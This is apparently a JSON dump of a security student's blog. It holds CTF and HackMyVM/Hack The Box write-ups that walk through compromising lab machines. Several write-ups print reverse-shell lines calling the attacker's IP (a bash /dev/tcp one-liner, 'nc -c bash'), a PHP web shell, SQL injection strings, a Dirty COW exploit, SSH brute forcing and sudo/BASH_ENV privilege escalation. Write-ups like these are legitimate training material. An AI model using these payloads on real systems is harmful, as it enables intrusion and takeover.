[{"content":"\rGitHub Repository\nIn this section, you will find the CTF machines I have personally created. Currently, there is only one machine available called SilentDev, with plans to add more at different difficulty levels.\nEach machine offers challenges designed to practice exploitation and analysis techniques, from basic to more advanced skills.\nMedium Difficulty Machines 🟠 SilentDev SilentDev requires some basic exploitation and analysis skills, as well as more advanced techniques in certain parts. It\u0026rsquo;s an excellent challenge for intermediate players wanting to broaden their CTF experience.\nLink to download: SilentDev\n","permalink":"http://localhost:1313/projects/ctfmachines/","summary":"CTF Machines created by me","title":"CTF Machines"},{"content":"GitHub Repository\nWelcome to my personal collection of CTF (Capture The Flag) challenges. Designed to help you practice, learn, and have fun in the world of cybersecurity and ethical hacking.\nChallenges will be updated periodically so there’s always something new to explore.\n⚠️ Disclaimer:\nThese challenges are for educational purposes only. I am not responsible for the misuse of these skills for illegal or unethical activities. Always practice in authorized environments.\n📂 Challenge Categories 🖼️ Steganography 🔑 Cryptography 🔒 Exploitation 🌐 Networking 🌀 Obfuscation 🤝 Collaborate! Have a challenge you’d like to share?\nSubmit your challenge — Send me your idea or files. Get in touch — DM me on Twitter: @CyberConper Be featured — Your challenge will be added here with full credit. 🖼️ Steganography 👨‍💻 CTF 🌐 Link Challenge 01 Download Challenge 05 Download Challenge 08 Download 🔑 Cryptography 👨‍💻 CTF 🌐 Link Challenge 02 Download Challenge 04 Download 🔒 Exploitation 👨‍💻 CTF 🌐 Link Challenge 03 Download 🌐 Networking 👨‍💻 CTF 🌐 Link Challenge 06 Download 🌀 Obfuscation 👨‍💻 CTF 🌐 Link Challenge 07 Download ","permalink":"http://localhost:1313/projects/ctfchallenges/","summary":"\u003cp\u003e\u003ca href=\"https://github.com/Conper/CTF-Challenges\"\u003eGitHub Repository\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eWelcome to my personal collection of \u003cstrong\u003eCTF (Capture The Flag)\u003c/strong\u003e challenges.\nDesigned to help you practice, learn, and have fun in the world of cybersecurity and ethical hacking.\u003cbr\u003e\nChallenges will be updated periodically so there’s always something new to explore.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003e⚠️ Disclaimer:\u003c/strong\u003e\u003cbr\u003e\nThese challenges are for \u003cstrong\u003eeducational purposes only\u003c/strong\u003e. I am not responsible for the misuse of these skills for illegal or unethical activities. Always practice in authorized environments.\u003c/p\u003e","title":"🏴‍☠️ CTF Challenges"},{"content":"GitHub Repository\nDescription Opened-Ports is a Linux script that uses Nmap to scan a target and extract only the most relevant information:\nOpen ports Services running on those ports Service versions Detected operating system It can:\nAnalyze a previously saved Nmap scan result file. Perform a new scan from scratch and then analyze the results. 📝 Note: Designed for Linux. Functionality on other operating systems is not guaranteed.\nInstallation (Linux) Download the script: wget https://raw.githubusercontent.com/Conper/Opened-Ports/main/oports.sh mv ./oports.sh /usr/bin/oports chmod +x /usr/bin/oports ","permalink":"http://localhost:1313/projects/oports/","summary":"TicTacToe game created in Android Studio with Kotlin","title":"Opened Ports"},{"content":"GitHub Repository\nThis section showcases a TicTacToe game I created in Android Studio with Kotlin.\nIt was a good practice project to learn the basics of mobile development and Kotlin at the time.\nPreview:\n","permalink":"http://localhost:1313/projects/tictactoeapp/","summary":"TicTacToe game created in Android Studio with Kotlin","title":"TicTacToe App"},{"content":"\rI am currently studying Systems and Network Administration, with a strong focus on offensive security and penetration testing. I enjoy discovering vulnerabilities, exploiting them in controlled environments, and learning from the process to strengthen overall security.\nI improve my skills by solving CTF challenges on platforms like Hack The Box and HackMyVM.\n📧 You can contact me here: contact@conper.xyz\n","permalink":"http://localhost:1313/about/","summary":"\u003cdiv style=\"display: flex; justify-content: center;\"\u003e\r\n  \u003cimg src=\"/images/avatar.jpg\" alt=\"Mi foto\" width=\"200\" style=\"border-radius: 50%; box-shadow: 0 0 10px rgba(0,0,0,0.3); margin-bottom: 50px;\"/\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eI am currently studying \u003cstrong\u003eSystems and Network Administration\u003c/strong\u003e, with a strong focus on \u003cstrong\u003eoffensive security\u003c/strong\u003e and \u003cstrong\u003epenetration testing\u003c/strong\u003e.\nI enjoy discovering vulnerabilities, exploiting them in controlled environments, and learning from the process to strengthen overall security.\u003c/p\u003e\n\u003cp\u003eI improve my skills by solving \u003cstrong\u003eCTF challenges\u003c/strong\u003e on platforms like \u003ca href=\"https://app.hackthebox.com/profile/1296157\"\u003e\u003cstrong\u003eHack The Box\u003c/strong\u003e\u003c/a\u003e and \u003ca href=\"https://hackmyvm.eu/profile/?user=Conper\"\u003e\u003cstrong\u003eHackMyVM\u003c/strong\u003e\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003e📧 You can contact me here: \u003ca href=\"mailto:contact@conper.xyz\"\u003e\u003cstrong\u003econtact@conper.xyz\u003c/strong\u003e\u003c/a\u003e\u003c/p\u003e","title":"About me"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/easy/atom/","summary":"Difficulty: Easy 🟢","title":"Atom - HackMyVM"},{"content":"\rMachine Link\nWhen starting the machine, it displays its IP address.\nIP of the victim machine\rLet\u0026rsquo;s begin with a quick NMAP scan to identify the open ports on the target machine.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn 192.168.18.184 Now that we have identified the open ports, we will perform a more detailed scan to determine the services running on each port along with their respective versions and other relevant details.\nnmap -sCV -p80,3306 -n -Pn 192.168.18.184 -oN target Visiting the site hosted on port 80 (HTTP) brings us to a login page.\nLogin screen\rI have found that the qdPM version is vulnerable and the password is exposed.\nI search for vulnerabilities in qdPM on searchsploit\rThe username and password can be found in this directory:\nPath where the username and password are located\rWe obtain the file\rWe read the file and find that it is a YAML configuration for a database, containing the username and password needed to access it. YAML files like this are commonly used to store configuration data in a simple, readable format with key-value pairs and indentation.\nNow we log in, but not on the website since we don\u0026rsquo;t have an email, but through port 3306 (MySQL) to access the database hosting the victim machine.\nWe are inside the database\rI select the \u0026lsquo;hidden\u0026rsquo; database:\nWe find 2 tables: \u0026lsquo;url\u0026rsquo; and \u0026lsquo;users\u0026rsquo;:\nOn one hand, in the \u0026lsquo;users\u0026rsquo; table, we find IDs, usernames, and passwords.\nOn the other hand, in the \u0026lsquo;url\u0026rsquo; table, we obtain a list of URLs.\nWe will save all the information obtained in a file.\nTo start, we will use WFUZZ to find which URLs can serve as subdomain names.\nwfuzz -c -w URLs.txt -u 192.168.18.184 -H \u0026#34;HOST: FUZZ\u0026#34; We notice that \u0026lsquo;party.bah.hmv\u0026rsquo; is different from the rest. So, we add it to the /etc/hosts file to make our machine recognize that subdomain with the corresponding IP.\nsudo nano /etc/hosts And now we access.\nIt prompts us to log in. I decide to use the username and password we obtained earlier.\nUser: qpmadmin\rPassword: qpmpazzw And we are in. Now, I am going to set up a reverse shell for a better interface, and also configure the TTY for improved control.\nLet\u0026rsquo;s enumerate the users on the victim machine:\ngrep /bin/bash /etc/passwd Users in the machine\rPrivilege escalation to rocio We see a user named rocio, which is present in the table we downloaded earlier from the database.\nRocio password\rWe switch to the rocio user and obtain the user flag.\nPrivilege escalation to root To do this, we will use pspy, which is a monitoring tool for Linux systems that helps detect important activities and processes discreetly.\nThen, using netcat, we will transfer the program from our local machine to the victim machine.\nVictim machine:\nnc -lvnp 8888 \u0026gt; pspy64 Local machine:\nnc 192.168.18.184 8888 \u0026lt; pspy64 And we grant permissions to pspy64.\nWe run pspy64 and observe the following.\nIt is a command line that executes shellinaboxd, a server that provides a browser-based web terminal. This service allows command line access through a web browser using the HTTP protocol. We observe that the root is running what is in /tmp/dev when someone accesses the /devel directory. Here in the shellinaboxd manual, we can see how it works:\nManual for shellinaboxd\rSo, I am going to create a file named dev in the /tmp directory where it sends a Reverse Shell, allowing quick access to the root user.\nContents of the 'dev' file\rAnd we grant permissions:\nchmod +x dev First, we set up a listener on port 4444 to catch any incoming connections, then we access the /devel directory.\nAnd we receive the Reverse Shell without any issues.\nWe are root\rWe obtain the root flag, and there you go, we have successfully completed hacking the machine.\n","permalink":"http://localhost:1313/writeups/easy/bah/","summary":"Difficulty: Easy 🟢","title":"Bah - HackMyVM"},{"content":"\rMachine Link\nWe find the victim machine’s IP address using the arp-scan tool, looking for a MAC address starting with 08:, which is typical for virtual machines.\nNext, we run an NMAP scan to identify open ports.\nAs a result, we observed that ports 22 (SSH) and 80 (HTTP) are open. Inside the web, we can see the following.\nIf we click on any link, we notice that it doesn\u0026rsquo;t load because it\u0026rsquo;s a domain that our local machine is not aware of.\nOur machine is not aware of that domain\rSo, we are going to edit the /etc/hosts file and add this domain with its corresponding IP:\nsudo nano /etc/hosts Now, upon entering the victim machine\u0026rsquo;s IP address again in Firefox, we see a website with an improved appearance.\nClicking on \u0026ldquo;Hello world!\u0026rdquo; we encounter a user and a comment.\nUser\rComment\rAs we have seen earlier, the website is built with WordPress. So, let\u0026rsquo;s use the wpscan tool to gather more information. Using this tool, we can confirm the existence of the user \u0026lsquo;smart_ass\u0026rsquo;.\nEnumerating users:\nwpscan --url http://beloved/ -e u Result of user enumeration\rNow, with the following command, we will enumerate the WordPress plugins used by this website:\nwpscan --url http://beloved/ --plugins-detection aggressive -t 50 --api-token=\u0026#39;YOUR_API\u0026#39; 📝 NOTE: To get the API key, you must register at wpscan.com\nAs a result, we can observe a plugin called wpDiscuz with an old version that is vulnerable.\nI go to Metasploit and find that it has an exploit that we can use for RCE (Remote Code Execution).\nExploit\rSetting up the options\rAnd we execute it with the run or exploit command, and now we would be inside:\nWe use the \u0026lsquo;shell\u0026rsquo; command to spawn a shell and then configure the TTY.\nPrivilege escalation to beloved When navigating to the /var/www directory, we can access the .bash_history file and review some executed commands.\nLater, after running sudo -l, we see that we are allowed to execute the nokogiri binary as the user beloved.\nSo, I decide to copy and execute the command I saw in the bash_history, and an Interactive Ruby (IRB) session opens.\nIn an Interactive Ruby session\rSo, we can execute commands with the following structure:\nsystem \u0026#39;COMMAND\u0026#39; So, I run a command to spawn a shell as beloved, and just like that, we become the beloved user.\nsystem \u0026#39;/bin/bash\u0026#39; And we can obtain the user flag.\nPrivilege escalation to root For the next privilege escalation, we will use pspy, which is a program that monitors the processes occurring on the machine.\nNow, let\u0026rsquo;s transfer pspy64 from our local machine to the victim machine by creating a web server with Python on port 8080.\nWe grant permissions with \u0026lsquo;chmod +x pspy64\u0026rsquo; and run it with \u0026lsquo;./pspy64\u0026rsquo;.\nchmod +x pspy64 ./pspy64 We notice that a command is executed every minute.\nThe chown command changes the owner and group of files or directories. In this case, it is applied to everything inside the /opt directory. Inside /opt, we found the root user\u0026rsquo;s id_rsa file (a private SSH key) and since we have write permissions in this directory, it could be exploited.\nNow, we will exploit chown to change the owner of the root\u0026rsquo;s id_rsa to beloved. (Link where it explains how to exploit this vulnerability: Wildcard Injection)\nWe can do it by executing the following commands in /opt:\ntouch reference touch -- --reference=reference After waiting a minute, we will see that the id_rsa file becomes owned by us. In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues. But since we already have the root\u0026rsquo;s id_rsa, we don\u0026rsquo;t need anything else.\nThe root's id_rsa is now under our ownership\rWe copy the contents of the id_rsa file and save it to our local machine. Next, we escalate privileges by running:\nchmod 600 id_rsa And we log in via SSH using the root user and this id_rsa, like this:\nssh -i id_rsa root@IP Finally, we obtain the root flag.\n","permalink":"http://localhost:1313/writeups/easy/beloved/","summary":"Difficulty: Easy 🟢","title":"Beloved - HackMyVM"},{"content":"\rMachine Link\n⚙️ Characteristics Characteristic Value Language C / C++ Arch x86-64 Platform Unix / Linux 🗒️ Writeup When trying to run the binary in different ways, it only returns the message \u0026ldquo;Bingus exploded\u0026rdquo;.\nWhat we\u0026rsquo;ll do is open the binary in Ghidra to inspect the code and find the function that checks the input.\nWe find the function that decides whether it has been exploited or not. We’ll analyze the function to understand the program’s logic and figure out how to make it print \u0026ldquo;Bingus survived\u0026rdquo;.\nBefore we start, we need to make it clear that param_1 is the number of arguments and param_2 is the list of program arguments.\nFirst condition: The conditional is triggered if any of these conditions are true:\nThere isn’t exactly one argument besides the program name.\nThe two characters of the argument are not the same.\nThe argument does not have exactly 2 characters.\nIn any of these cases, it prints \u0026ldquo;Bingus exploded\u0026rdquo;.\nTherefore, the hint to move forward is:\nPass exactly 1 argument.\nThe argument must be 2 identical characters.\n📝 NOTE: param_2 + 8 points to argv[1], the first argument of the program, because in memory each pointer takes up 8 bytes in 64-bit systems.\nLoop: For this part, I’ll rename the variables to make it simpler and easier to read.\nWhat this loop does is add each character of the string \u0026ldquo;This is a red herring\u0026rdquo; to num, summing their ASCII values since in C a character is treated as an integer in arithmetic operations.\nTo see the result after the loop finishes, we recreate the code:\n#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;string.h\u0026gt;\rint main() {\rint num = 0x66; /* num = 102 */\rint i;\rsize_t x;\rconst char *str = \u0026#34;This is a red herring\u0026#34;;\rx = strlen(str); /* x = 21 */\rfor (i = 0; i \u0026lt; x; i++) {\rnum = num + str[i];\r}\rprintf(\u0026#34;%d\u0026#34;, num);\rreturn 0;\r} And we get num = 2021.\nFinal condition: This last condition adds num and the ASCII values of the first two characters of the parameter string. If the total is 2245 (0x8c5), it prints \u0026ldquo;Bingus survived\u0026rdquo;.\n$$\r\\begin{align*}\r2021 + 2x \u0026= 2245 \\\\\r2x \u0026= 224 \\\\\rx \u0026= 112\r\\end{align*}\r$$\rTherefore, the resulting character in ASCII is 112, which corresponds to the letter p, and since the program expects two identical characters, the correct result is pp.\n","permalink":"http://localhost:1313/crackmes/bingus/","summary":"Difficulty: Easy 🟢","title":"Bingus"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/easy/candy/","summary":"Difficulty: Easy 🟢","title":"Candy - Dockerlabs"},{"content":"Writeup in Spanish 🇪🇸 This machine was created by Pylon.\n","permalink":"http://localhost:1313/writeups/easy/canto/","summary":"Difficulty: Easy 🟢","title":"Canto - HackMyVM"},{"content":"\rMachine Link\nTo begin working on the machine, we first perform a quick scan to identify open ports using Nmap:\nsudo nmap -sS --min-rate 4500 -n -Pn -vvv 10.10.11.82 Once we know which ports are open, we perform a more detailed scan on them:\nnmap -sCV -p22,8000 -n -Pn 10.10.11.82 -oN target We can see that port 8000 is hosting a web server.\nHome page\rClicking on the Download App button downloads a ZIP file.\nThis archive contains the default structure of the web application.\nHere we can see the files it contains, and after checking the requirements, we notice that it uses a vulnerable version of js2py, which can be exploited through RCE (Remote Code Execution). Exploit: CVE-2024-28397\nTo exploit this, we will run the provided JavaScript code inside an interpreter. Let’s register on the victim’s web application and see which programming language we can execute.\nLuckily, we can execute JavaScript directly from the web interface.\nIt works perfectly, we can execute commands as the user app. Next, we will establish a Reverse Shell to gain access inside the machine.\nWe start by setting up a listener with Netcat on port 4444, and then execute the Reverse Shell payload in the exploit.\nNow that we are inside, let’s remember that when we downloaded the ZIP earlier, it contained a file named users.db. At that time, it was empty since it was just the default database. Knowing its location and purpose, let’s inspect it again.\nWe transfer the file to our local machine for easier handling.\nThis is where the passwords of all users registered in the web editor are stored, including ours.\nTo save time, we will first check which users exist on the system so we only attempt to crack relevant passwords.\nPerfect, we see that marco exists on the machine. We will use Hashcat to crack Marco’s password and see if it is reused for system login (John The Ripper didn’t work for me here).\nWe manage to log in without any issues, which allows us to retrieve the User Flag.\nPrivilege escalation to Root Running sudo -l, we discover that Marco can run a backup binary as root without needing the root password.\nThis binary requires a configuration file to work. Fortunately, we already have one in Marco’s home directory. Although it is owned by root, Marco has read permissions.\n(With the -h option we can see all the available parameters.)\nFrom this, we learn that the root user employs this configuration file to back up the web application we’ve been exploiting earlier. To escalate, we can create a copy of the configuration file and modify it so that the backup targets the /root directory.\nWe then run the backup using:\nsudo /usr/local/bin/npbackup-cli -c ./test.conf -b Next, we list all snapshots to identify the one we need:\nsudo /usr/local/bin/npbackup-cli -c ./test.conf --snapshots Once we know the snapshot ID, we can list its contents:\nsudo /usr/local/bin/npbackup-cli -c ./test.conf --snapshot-id ID --ls Finally, we obtain the Root Flag and complete the machine.\nsudo /usr/local/bin/npbackup-cli -c ./npbackup.conf --snapshot-id 0121d0a3 --dump /root/root.txt ","permalink":"http://localhost:1313/writeups/easy/codetwo/","summary":"Difficulty: Easy 🟢","title":"CodeTwo - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/easy/consolelog/","summary":"Difficulty: Easy 🟢","title":"ConsoleLog - Dockerlabs"},{"content":"\rMachine Link\nWhen starting the machine, it displays its IP address.\nIP address of the victim machine\rWe perform a scan using the NMAP tool to see which ports the target machine has open.\nnmap -sCV -n -Pn 192.168.18.189 -oN target Port scanning with NMAP\rAnd we observe that only port 80 is open. We access the website hosted on the target machine and observe the following:\nWe click the \u0026lsquo;Login\u0026rsquo; link, but it doesn’t load since our machine can’t resolve the domain.\nDomain doc.hmv\rWe need to add the domain doc.hmv to the /etc/hosts file, mapping it to the IP address of the target machine.\nsudo nano /etc/hosts Domain with its IP in /etc/hosts\rAnd we access it again.\nI experienced a bit and was able to access it through a SQL injection in the following way.\n\u0026#39; or 1=1-- - SQL Injection\rAnd we successfully gain access without any issues.\nI now decide to run a directory enumeration with Wfuzz to check for any directories that might be useful.\nwfuzz -c -u http://doc.hmv/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,200 Result after enumerating directories\rThe directory /uploads could be useful if we can upload files. I search, and indeed, we can.\nSo, we are going to download a PHP script that, when the file is uploaded, will send us a Reverse Shell, allowing us to access the machine.\nwget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz tar -xf php-reverse-shell-1.0.tar.gz We modify the information as instructed, and we are good to go.\nFor example, I am going to upload the file to the following location:\nIf it doesn\u0026rsquo;t work there, try uploading it in other locations.\nAnd with that, we have successfully gained access to the target machine.\nI set up the TTY and enumerate the users on the machine.\ngrep /bin/bash /etc/passwd There are two users: bella and root.\nPrivilege escalation to Bella While browsing the directories, I found a PHP file named initialize.php that contains Bella’s password.\nWe gain access to the Bella user account and obtain the user flag.\nPrivilege escalation to Root If we run sudo -l, we can see the following.\nWe are able to execute the doc binary with root privileges. Inspecting its strings reveals that, when executed, the binary starts a server on port 7890.\nstrings /usr/bin/doc We see that it creates a web server.\nSince we can’t access it directly through the browser, let’s set up Port Forwarding to forward port 7890 from the target machine to port 7890 on our local machine. We will use Chisel for this.\ncurl https://i.jpillora.com/chisel! | bash And we also transfer the binary to the victim machine.\nLocal machine:\nVictim machine:\nAnd we grant it execute permissions.\nchmod +x chisel Then we run Chisel with the following commands to set up Port Forwarding.\nLocal machine:\nsudo chisel server --reverse -p 4444 Victim machine:\n./chisel client 192.168.18.100:4444 R:7890:127.0.0.1:7890 \u0026amp; Now that the server is running, accessing 127.0.0.1:7890 on our local machine should display the hosted webpage.\nThe web interface shows a list of Python modules and directories related to the Python environment, rather than individual .py files. It displays built-in modules and folders like /tmp and /usr/lib/python3.9, without showing file extensions. To verify this, I will create a Python file named abcd.py in Bella’s /home directory to see if it appears in the listing.\nNow, the file appears as expected. Next, we will proceed to send a reverse shell with root privileges.\nFirst, we will create a file that I will call reverse.py with the following content:\nimport os os.system(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.18.100/7777 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;) Python Reverse Shell code\rThen we run the doc binary as root:\nsudo doc We set up a listener on port 7777 on our local machine to receive the Reverse Shell.\nnc -lvnp 7777 And now we access the web and click on the file we created (reverse.py).\nNow that we have received the Reverse Shell and are the root user, we can obtain the root flag.\nAnd the machine is completely hacked.\n","permalink":"http://localhost:1313/writeups/easy/doc/","summary":"Difficulty: Easy 🟢","title":"Doc - HackMyVM"},{"content":"\rMachine Link\nTo begin, we use the arp-scan tool to identify devices on our network and find a MAC address starting with 08:, which is commonly associated with virtual machines.\nsudo arp-scan -I eth0 --localnet And we find the IP of the victim machine: 192.168.18.191.\nNow it’s time for open port scan, for which we will use Nmap. First, we run a quick scan of all ports on the target machine with the following command:\nsudo nmap -sS -p- --min-rate 4500 -n -Pn 192.168.18.191 Once we identify the open ports, we perform a more detailed scan on those specific ports:\nnmap -sCV -p22,80 -n -Pn 192.168.18.191 -oN target When we visit the hosted website, we see a login page, just like the Nmap scan showed.\nWe will perform directory enumeration with Gobuster to identify any directories that might help us.\ngobuster dir -u http://192.168.18.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt We find the following directory, which will be useful since the others don’t contain anything significant\nInside the /secret directory, there is an image, so I decide to download it and apply steganography techniques to see if there is any hidden information in the image.\nwget http://192.168.18.191/secret/doubletrouble.jpg We are going to use Stegseek.\nUsing Stegseek\rInside this, you will find the login credentials.\nSo, we log in through the page we saw earlier using the obtained credentials.\nNow that we are inside, let\u0026rsquo;s upload a malicious PHP file to execute commands. I am going to upload it as the user\u0026rsquo;s profile picture.\nWe upload the malicious PHP\rThe code:\n\u0026lt;?php echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;; ?\u0026gt; Malicious PHP\rWe upload it and navigate to the /uploads directory we found earlier while enumerating directories with Gobuster. Then, we access the users folder, where we will find our PHP file.\nAnd now, we can execute commands.\nWe execute the command 'id'\rSo, we are going to perform a Reverse Shell to gain access to the machine. To do this, we set up a listener on port 4444 with netcat.\nnc -lvnp 4444 And then we execute this code on the website:\nnc -c bash 192.168.18.100 4444 By checking the sudo permissions, we see that the awk binary can be executed as root.\nSudo permissions\rThe GTFObins page shows how to exploit these permissions.\nCode we need to execute\rNow, we execute the command:\nsudo awk \u0026#39;BEGIN {system(\u0026#34;/bin/sh\u0026#34;)}\u0026#39; A new machine\rWe are not done yet. Although we have root access, we can’t find any flags. Instead, we discover another machine with the same name inside this one, so we need to download it.\nVictim machine:\npython3 -m http.server 8080 Our real machine:\nSince I am using Windows 10, I will use the following command to download it from PowerShell:\nInvoke-WebRequest -Uri \u0026#34;http://192.168.18.191:8080/doubletrouble.ova\u0026#34; -OutFile \u0026#34;newmachine.ova\u0026#34; Now, we start the machine and find its IP address using arp-scan. In this case, the IP of the second machine is 192.168.18.193.\nSo, I perform another port scan with NMAP.\nAnother login page:\nNow, we will use Burp Suite to intercept data, and then use SQLMap to check if the login page is vulnerable to SQL Injection (SQLI).\nWe copy all this content and paste it into a file, which I will name sqlmap.txt. Now, we run SQLMap using this file.\nsqlmap -r sqlmap.txt And we observe that it is indeed vulnerable. Next, we will execute the following command to show us the existing databases.\nsqlmap -r sqlmap.txt -dbs 'Doubletrouble' database\rNow that we have found the doubletrouble database, we dump its contents.\nsqlmap -r sqlmap.txt -D doubletrouble --dump Users and passwords\rWe found two usernames and passwords. The first one didn’t work, but clapton worked for SSH.\nAnd finally, we obtain the user flag.\nPrivilege escalation to Root We observe that the machine\u0026rsquo;s version is vulnerable to a Local Privilege Escalation.\nVulnerable kernel version\rAnd we download it, following the steps it indicates.\nmv 40839.c dirty.c And now we transfer it to the victim machine using netcat.\nVictim machine:\nnc -lvnp 8888 \u0026gt; dirty.c Local machine:\nnc 192.168.18.193 8888 \u0026lt; dirty.c And now we compile it.\ngcc -pthread dirty.c -o dirty -lcrypt So, we run it, providing the password we want. In my case, it will be \u0026lsquo;hello\u0026rsquo;.\n./dirty my-new-password Then we become the root user, now named firefart.\nsu firefart And we enter the password we assigned earlier.\nNow that we have root access, we can proceed to obtain the root flag.\nMachine completed!\n","permalink":"http://localhost:1313/writeups/easy/doubletrouble/","summary":"Difficulty: Easy 🟢","title":"Doubletrouble - HackMyVM"},{"content":"\rTo start, we will perform a quick port scan using the Nmap tool to see which ports are open.\nsudo nmap -sS -p- -n -Pn -vvv 10.10.11.67 Knowing that ports 22 and 80 are open, we will perform a more detailed scan on these.\nsudo nmap -sCV -p22,80 -n -Pn 10.10.11.67 -oN target When accessing the website, we don’t see much.\n📝NOTE: I have added the domain environment.htb with its IP in /etc/hosts.\nTherefore, we will enumerate directories and files using Feroxbuster to see what might be hidden on the web.\nferoxbuster -u http://environment.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50 --filter-status 403,404 When accessing /upload, we see code errors and that the website uses Laravel (a PHP framework) with a version that is vulnerable. CVE-2024-52301\nThis vulnerability allows an attacker to make the application think it is running in a different environment (like “production” or “development”) using the URL, which can change what is displayed on the website. We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;. This probably works because the upload filter only checks the final extension, and by adding the extra dot, the file passes validation, even though PHP interprets it normally. Now we can try executing commands on the server through the uploaded file’s URL.\nWe execute a Reverse Shell and access the machine.\nhttp://environment.htb/storage/files/cmd.php?cmd=nc -c /bin/bash 10.10.14.32 4444 Privilege escalation to Hish If we navigate to hish’s folder, we can read the User Flag. We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation. The interesting part is the BASH_ENV variable, which Bash uses to run a script when starting a shell that is non-interactive, that is, a shell that runs commands automatically without the user typing them. Since sudo preserves this variable, we can point it to our own script, and when we run sudo /usr/bin/systeminfo, Bash will execute our script with root privileges.\nWe create a Bash script in Hish’s home directory with the following content:\n#!/bin/bash\r/bin/bash Then we assign the BASH_ENV variable pointing to our script:\nexport BASH_ENV=/home/hish/root.sh When we execute sudo /usr/bin/systeminfo, Bash will automatically load our script, and we obtain a shell with root privileges.\nWe get the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/environment/","summary":"Difficulty: Medium 🟠","title":"Environment - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/family/","summary":"Difficulty: Medium 🟠","title":"Family - HackMyVM"},{"content":"\rMachine Link\nWe can see that when we open the machine it tells us its IP:\nSo knowing that the IP of the machine is 192.168.18.28, we are going to do a simple NMAP scan to see what ports it has open and what service they are running:\nNMAP simple scan\rWe can see that this machine hosts a web server on port 80 and that port 22 (ssh) is open.\nThis is what we see when we open the web server:\nIt tells us not to think too much. So we decided to try to enter through port 22 by brute force with the hydra tool.\nWe are going to set the user as root and as the password we will set a dictionary (in this case common.txt) so that it goes word by word trying to see if any word in this dictionary is the correct password:\n🚨 IMPORTANT: Normally, you cannot access as the root user via SSH for security reasons. Also, the rockyou.txt file is usually used for password cracking. This is an exception because it’s a very easy difficulty machine.\nResult after using hydra\rAnd we found it! The user is \u0026ldquo;root\u0026rdquo; and the password is \u0026ldquo;simple\u0026rdquo;. Now we are going to enter through port 22 with this username and password.\nNow that we are inside, with the \u0026ldquo;ls\u0026rdquo; command we see what there is, and we find that we already have the user flag and the root flag.\nSo machine completed!\n","permalink":"http://localhost:1313/writeups/very-easy/gift/","summary":"Difficulty: Very Easy 🔵","title":"Gift - HackMyVM"},{"content":"\rMachine Link\nTo start, we perform a basic NMAP scan to find out which ports the target machine has open.\nnmap 192.168.18.54 Simple NMAP scan\rAs we can observe, we find ports 80 and 22 open. Port 80 hosts a webpage, and port 22 runs the SSH service.\nWe open the website and encounter the following:\nWe view this with Ctrl + U\rWe obtain a possible username: 